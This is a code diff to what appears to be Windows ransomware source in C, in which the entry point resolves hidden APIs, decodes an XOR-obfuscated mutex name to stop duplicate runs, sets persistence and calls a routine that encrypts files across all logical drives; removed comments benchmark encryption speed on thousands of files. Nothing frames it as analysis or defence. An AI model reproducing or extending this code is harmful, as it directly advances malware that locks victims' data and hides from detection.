@@ -3,7 +3,7 @@
 #include "Threading.h"
 #include "File.h"
 #include "PE.h"
-extern FARPROC APIArray[52];
+extern FARPROC APIArray[54];
 
 int beginEncrypt() {
 	typedef DWORD(WINAPI* MemeGetLogicalDriveStringsA)(DWORD nBufferLength, LPSTR lpBuffer);
@@ -27,9 +27,32 @@ int beginEncrypt() {
 
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 	if (initAPIArray() == -1) {
+		printf("Fails\n");
 		return -1;
 	}
 
+	BYTE mutex_key[5] = { 41, 188, 104, 237, 166 };
+	BYTE mutex_str[25] = { 161, 33, 254, 104, 60, 181, 42, 241, 38, 97, 184, 41, 230, 117, 41, 166, 49, 237, 121, 52, 224, 116, 161, 43, 89 };
+
+	// Mutex wbizecif48njqgpprzkm6769
+	for (int i = 0; i < 25; i++) {
+		mutex_str[i] ^= 0xFF;
+		mutex_str[i] ^= mutex_key[i % 5];
+	}
+
+	typedef HANDLE(WINAPI* MemeCreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
+
+	MemeCreateMutexA TempCreateMutexA = (MemeCreateMutexA)APIArray[52];
+
+	HANDLE hMutex = TempCreateMutexA(NULL, TRUE, (LPCSTR)mutex_str);
+
+	typedef DWORD(WINAPI* MemeWaitForSingleObject)(HANDLE hHandle, DWORD  dwMilliseconds);
+
+	MemeWaitForSingleObject TempWaitForSingleObject = (MemeWaitForSingleObject)APIArray[53];
+
+	if (TempWaitForSingleObject(hMutex, 0)) {
+		return -1;
+	}
 	if (mainPersist() == -1) {
 		return -1;
 	}
@@ -42,10 +65,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 		cleanExplorerLL();
 		return -1;
 	}
-
-	// 10387 small files -> 15039 ms to encrypt small files
-	// 53 medium files -> 6237 ms to encrypt medium files
-	// 25 large files -> 25000 ms to encrypt large files
 
 	beginEncrypt();
 	cleanUpThread();
